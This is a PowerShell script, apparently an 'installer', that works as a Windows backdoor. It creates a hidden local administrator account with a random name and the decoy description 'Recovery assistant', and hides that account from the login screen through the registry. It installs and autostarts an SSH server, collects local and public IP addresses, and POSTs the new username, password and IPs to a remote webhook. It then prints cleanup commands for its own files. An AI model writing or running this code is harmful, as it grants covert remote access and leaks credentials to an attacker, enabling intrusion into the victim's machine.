function random_text {
    return -join ((65..69) + (97..112) | Get-Random -Count 8 | ForEach-Object {[char]$_})
}

$STARTDIR = Get-Location
$NEWUSER = random_text
$WURL = Get-Content "$env:temp\u.cfg"
$LPWORD = $(random_text) + $(random_text) + $(random_text)
$LPWORD_S = (ConvertTo-securestring $LPWORD -AsPlainText -Force)
$WORKDIR = random_text
$WORKPATH = "$env:temp\$WORKDIR"
$LIP = (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias Ethernet).IPAddress
$RIP1 = Invoke-RestMethod -UseBasicParsing -Uri ('http://ipinfo.io/'+(Invoke-WebRequest -UseBasicParsing -uri "http://ifconfig.me/ip").Content)
$RIP2 = (Invoke-WebRequest -UseBasicParsing -Uri 'http://icanhazip.com/').Content
$CONFIG = "$WORKPATH\new.cfg"

mkdir $WORKPATH
attrib -h -s -r "$WORKPATH"
Set-Location $WORKPATH

function create_account {
    [CmdletBinding()]
    param (
        [string] $Username,
        [securestring] $Password
    )
    begin {}
    process {
        New-LocalUser "$NEWUSER" -Password $LPWORD_S -FullName "$NEWUSER" -Description "Recovery assistant"
        Add-LocalGroupMember -Group "Administrators" -Member "$NEWUSER"
    }
    end {}

}
create_account -Username $NEWUSER -Password $LPWORD_S

# Hide login trough registry
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" -Name "$NEWUSER" -Value 0 -Type DWORD -Force

# Hide path
Set-Location "C:\Users"
attrib -h -s -r "$NEWUSER"
Set-Location $WORKPATH

Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
Start-Service sshd
Set-Service -Name sshd -StartupType 'Automatic'



$hash = @{ "content" = "SD:$STARTDIR,WD:$WORKDIR,LIP:$LIP,RIP2:$RIP2,U:$NEWUSER,P:$LPWORD"; }
$JSON = $hash | convertto-json

Invoke-WebRequest -Uri $WURL -Method POST -Body $JSON -Headers @{'Content-Type' = 'application/json'}


# broke
# Add-Content -Path $CONFIG -Value "$STARTDIR"
# Add-Content -Path $CONFIG -Value "$LIP"
# Add-Content -Path $CONFIG -Value "$RIP1"
# Add-Content -Path $CONFIG -Value "$RIP2"
# Add-Content -Path $CONFIG -Value "$NEWUSER"
# Add-Content -Path $CONFIG -Value "$LPWORD"
# Add-Content -Path $CONFIG -Value "$WORKDIR"
#Invoke-WebRequest -Uri $WURL -Method POST -Body ($payload | ConvertTo-Json) -Headers @{'Content-Type' = 'application/json'}

Write-Output "Remove-Item $CONFIG"

Write-Output "Remove-Item $STARTDIR/installer.ps1"